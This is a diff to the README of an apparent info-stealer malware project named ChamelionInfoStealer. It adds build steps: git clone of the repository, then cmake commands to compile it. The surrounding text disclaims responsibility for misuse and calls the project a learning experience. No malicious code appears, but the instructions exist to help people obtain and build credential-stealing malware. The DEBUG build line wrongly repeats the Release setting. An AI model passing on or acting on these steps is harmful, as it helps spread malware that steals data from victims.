@@ -27,3 +27,15 @@ Note that the project will become bigger everyday.
 
 
 Also even though not available yet, i am not responsible of any misuses made by user of this program, it is a learning experience and everyone can contribute.
+
+<h2>How to compile and use ?</h2>
+You're gonna need to follow these steps to compile the project :
+     - **git clone https://github.com/k0rup71n/ChamelionInfoStealer**
+     - **cd ChamelionInfoStealer/Build**
+     - **cmake ../CMake**
+     
+     - (**RELEASE**) : **cmake --build . -D CMAKE_BUILD_TYPE=Release . **
+     or
+     - (**DEBUG**) : **cmake --build . -D CMAKE_BUILD_TYPE=Release . **
+     
+     - Compiled file will be located in ChamelionInfoStealer/Build/Release or Debug (Depending on how you compiled the file)
